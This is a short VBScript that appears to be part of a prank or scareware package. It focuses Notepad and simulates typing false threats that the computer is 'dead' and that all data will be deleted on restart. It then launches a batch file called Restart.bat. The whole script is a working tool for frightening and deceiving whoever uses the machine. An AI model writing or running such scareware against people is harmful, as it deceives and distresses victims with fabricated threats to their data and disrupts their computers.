Set ws = WScript.CreateObject("WScript.Shell")

' Wait for notepad to open (from batch file)
WScript.Sleep 500

' Make sure notepad is focused
ws.AppActivate "Notepad"
WScript.Sleep 500

' Type the text
Delay = 50
TypeText ws, "This computer is now dead. If you try to restart, all of your data will be deleted."
WScript.Sleep 1000
TypeText ws, "If you wait 7 days, your computer will be fine. Choose wisely..."

Sub TypeText(objShell, strText)
    For i = 1 To Len(strText)
        objShell.SendKeys Mid(strText, i, 1)
        WScript.Sleep Delay
    Next
    objShell.SendKeys "{ENTER}"
    WScript.Sleep Delay
End Sub

WScript.Sleep 5000
ws.Run ".\Restart.bat"